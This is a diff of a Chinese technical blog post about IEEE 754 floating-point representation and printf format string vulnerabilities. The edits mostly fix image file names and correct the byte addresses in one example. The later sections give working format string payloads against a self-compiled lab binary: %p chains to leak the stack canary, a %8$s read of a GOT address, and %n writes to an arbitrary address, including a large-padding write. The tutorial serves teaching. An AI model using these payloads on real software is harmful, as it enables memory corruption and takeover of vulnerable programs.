@@ -11,9 +11,9 @@
 <li>8位用于指数 (exponent)</li>
 <li>23位用于尾数 (mantissa or significand)</li>
 </ul>
-<p><img src="image1" alt=""></p>
+<p><img src="image1.png" alt=""></p>
 <p>双精度类似，此时指数位有11，尾数有52</p>
-<p><img src="image2" alt=""></p>
+<p><img src="image2.png" alt=""></p>
 <p>手工转换的思路是分别把整数部分和小数部分换成二进制，然后缩放成1.X * 2^n的二进制版本科学计数法。此时</p>
 <p>.X部分为尾数部分，n为<strong>阶码</strong>需要加上127，如果n为1那么指数位就是127+1 = 128。之所以会有这个规定，是为了考虑到n为负数的情况（只考虑正数的情况，十进制下小于1）。</p>
 <p>下面以8.5存储为单精度为例</p>
@@ -42,7 +42,7 @@
 <li><p>符号位 + 指数 + 尾数 = 0 10000010 00010000000000000000000。</p>
 </li>
 </ul>
-<p><img src="image3" alt=""></p>
+<p><img src="image3.png" alt=""></p>
 <h2 id="浮点数的分类"><a href="#浮点数的分类" class="headerlink" title="浮点数的分类"></a>浮点数的分类</h2><p>当然其实上面介绍的只是浮点数的一种类型的求值方式：规格化浮点数。</p>
 <p>浮点数有三种分类，<a href="https://www.cnblogs.com/zuoxiaolong/p/computer11.html">这篇文章</a>总结非常好直接抄过来</p>
 <ol>
@@ -66,9 +66,9 @@
 </ol>
 </li>
 </ol>
-<p><img src="image4" alt=""></p>
+<p><img src="image4.png" alt=""></p>
 <p>由此可以看出来，浮点数的取值范围。</p>
-<p><img src="image5" alt=""></p>
+<p><img src="image5.png" alt=""></p>
 <p>举个例子非规格化浮点数（考虑单精度，正数）</p>
 <ol>
 <li>非规格化数的最小值 = 2^-23 * 2^-126 = 2 ^ -149</li>
@@ -78,7 +78,7 @@
 <blockquote>
 <p>通过上面的分析可以发现，尽管浮点数表示的范围很广，但由于精度损失的存在，加上幂次的放大作用，一个浮点数实际上是表示了周围的一个有理数区间。如果将浮点数绘制到一个数轴上，直观上看，靠近0的部分，浮点数出现较密集。越靠近无穷大，浮点数分布越稀疏，一个浮点值代表了周围一片数据。从这个意义上来说，浮点数不宜直接比较相等，它们是代表了一个数据范围。实际应用中，如果要使用浮点数计算，一定要考虑精度问题。在满足精度要求的前提下，计算结果才是有效的。 在计算精度要求情形下，例如商业计算等，应该避免使用浮点数，严格采取高精度计算。</p>
 </blockquote>
-<p><img src="image6" alt=""></p>
+<p><img src="image6.png" alt=""></p>
 <p>再啰嗦一句，帮助理解，也就是这里非规格化数的最小值2 ^ -149代表了 0到2 ^ -149之间的所有正数。</p>
 <h2 id="浮点数的精度"><a href="#浮点数的精度" class="headerlink" title="浮点数的精度"></a>浮点数的精度</h2><p>单精度浮点数的精度主要由尾数部分决定。由于尾数有23位，加上隐含的1位，总共有24位的有效数字。</p>
 <p>现在，我们来计算这 24 位二进制数可以表示多少位十进制有效数字：log₁₀(2²⁴) ≈ 7.22</p>
@@ -107,7 +107,7 @@
 <li><p>printf实际上只会接受到double，int，long int等类型的参数。而从来不会实际接受到float，char，short等类型参数。</p>
 </li>
 </ol>
-<p><img src="image7" alt=""></p>
+<p><img src="image7.png" alt=""></p>
 <p>我们gdb调试结果来佐证一下。</p>
 <h2 id="格式化字符串漏洞"><a href="#格式化字符串漏洞" class="headerlink" title="格式化字符串漏洞"></a>格式化字符串漏洞</h2><p>先来看一下prinf支持的各种参数</p>
 <ul>
@@ -128,9 +128,9 @@
 <figure class="highlight c"><table><tr><td class="code"><pre><span class="line">gcc -g -Wall -fstack-protector-all -o program_with_canary program.c</span><br></pre></td></tr></table></figure>
 
 <p>Cannary会被从QWORD PTR fs:0x28放到栈上，然后我们用%p来读，一个%p读8字节的内存。</p>
-<p><img src="image8" alt=""></p>
+<p><img src="image8.png" alt=""></p>
 <p>实际需要多少个可以通过gdb或静态分析来算。这里给用14个就行了。</p>
-<p><img src="image9" alt=""></p>
+<p><img src="image9.png" alt=""></p>
 <h3 id="格式化字符串泄漏任意地址数据"><a href="#格式化字符串泄漏任意地址数据" class="headerlink" title="格式化字符串泄漏任意地址数据"></a>格式化字符串泄漏任意地址数据</h3><p>这种套路一般用来泄漏got表数据，先构想读地址的值在栈上，然后调用%s去读这个地址。</p>
 <p>因为这个地址需要在栈上，所以这里为方便用32位程序演示。这个值肯定和printf的第一个参数有一些偏移。所以最后我们需要用%n$s这种“加强版”的%s去读到偏移。</p>
 <figure class="highlight c"><table><tr><td class="code"><pre><span class="line">gcc -g -m32 -Wall -fno-<span class="built_in">stack</span>-protector -o vulnerable_program program.c</span><br></pre></td></tr></table></figure>
@@ -141,39 +141,39 @@
 <p>和刚才思路类似，先用以一坨%p看一下偏移</p>
 <figure class="highlight c"><table><tr><td class="code"><pre><span class="line">AAAA %p %p %p %p %p %p %p %p %p %p %p %p %p %p</span><br></pre></td></tr></table></figure>
 
-<p><img src="image10" alt=""></p>
+<p><img src="image10.png" alt=""></p>
 <p>这里AAAA被断开了，所以我们还需要padding一下</p>
 <figure class="highlight c"><table><tr><td class="code"><pre><span class="line">PPAAAA%p %p %p %p %p %p %p %p %p %p %p %p %p %p</span><br></pre></td></tr></table></figure>
 
-<p><img src="image11" alt=""></p>
+<p><img src="image11.png" alt=""></p>
 <p>所以我只需要用%8$s即可以读到GOT表地址</p>
 <figure class="highlight"><table><tr><td class="code"><pre><span class="line">python3 -c 'import sys; sys.stdout.buffer.write(b"PP\x10\xc0\x04\x08%8$s\n")'</span><br></pre></td></tr></table></figure>
 
 <figure class="highlight c"><table><tr><td class="code"><pre><span class="line">b main</span><br><span class="line"><span class="built_in">run</span> &lt; <span class="built_in">text</span></span><br></pre></td></tr></table></figure>
 
-<p><img src="image12" alt=""></p>
-<p><img src="image13" alt=""></p>
+<p><img src="image12.png" alt=""></p>
+<p><img src="image13.png" alt=""></p>
 <h3 id="格式化字符串向任意地址写入数据"><a href="#格式化字符串向任意地址写入数据" class="headerlink" title="格式化字符串向任意地址写入数据"></a>格式化字符串向任意地址写入数据</h3><p>这种要结合%n来利用，先来看一下%n的用法。</p>
 <figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="keyword">int</span> i;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"AAAA%n\n"</span>, &amp;i);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"%d\n"</span>, i);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
 
 <p>printf解析到%n会把输出的字符串的长度放在i中。</p>
-<p><img src="image14" alt=""></p>
+<p><img src="image14.png" alt=""></p>
 <p>在漏洞利用中，类似于我们用\x10\xc0\x04\x08%8$s去偏移8处读\x10\xc0\x04\x08地址的值。我门用\x10\xc0\x04\x08%8$n去偏移8处的\x10\xc0\x04\x08地址写入打印出来的字符个数。这样我们只要控制打印字数就可以控制任意地址的值了。</p>
 <figure class="highlight"><table><tr><td class="code"><pre><span class="line">python3 -c 'import sys; sys.stdout.buffer.write(b"PP\x10\xc0\x04\x08%8$n\n")'</span><br></pre></td></tr></table></figure>
 
 <p>修改前 p *0x0804c010</p>
-<p><img src="image15" alt=""></p>
+<p><img src="image15.png" alt=""></p>
 <p>修改后</p>
-<p><img src="image16" alt=""></p>
+<p><img src="image16.png" alt=""></p>
 <p>这里我们只输出六个字符，太少了。实际利用肯定要写入一个地址(比如one gadget的地址)，这个地址一般都很大比如0x80c0ffff，所以需要结合printf的对齐语法来写入大值。</p>
 <p>假设第10个偏移是0x0804c010，那我们理论上就可以把地址0x0804c010写入0x08ffffff的值</p>
 <figure class="highlight"><table><tr><td class="code"><pre><span class="line">python3 -c 'import sys; sys.stdout.buffer.write(b"%150994943d%12$nAA\x10\xc0\x04\x08\n")' &gt; te</span><br></pre></td></tr></table></figure>
 
-<p><img src="image17" alt=""></p>
+<p><img src="image17.png" alt=""></p>
 <p>在输出大量padding过后成功修改完地址</p>
-<p><img src="image18" alt=""></p>
+<p><img src="image18.png" alt=""></p>
 <p>这种方法简单粗暴，但更优雅的方式是逐字节修改。</p>
-<p>依次对0804c010写入0xff，0804c018写入0xff，0804c020写入0xff，0804c028写入0x08</p>
+<p>依次对0804c010写入0xff，0804c011写入0xff，0804c012写入0xff，0804c013写入0x08</p>
 <h2 id="附-non-pie-与-ASLR"><a href="#附-non-pie-与-ASLR" class="headerlink" title="附 non pie 与 ASLR"></a>附 non pie 与 ASLR</h2><p>程序是no pie的就算操作系统开了ASLR也没用？</p>
 <ol>
 <li><p>ASLR（Address Space Layout Randomization）：</p>
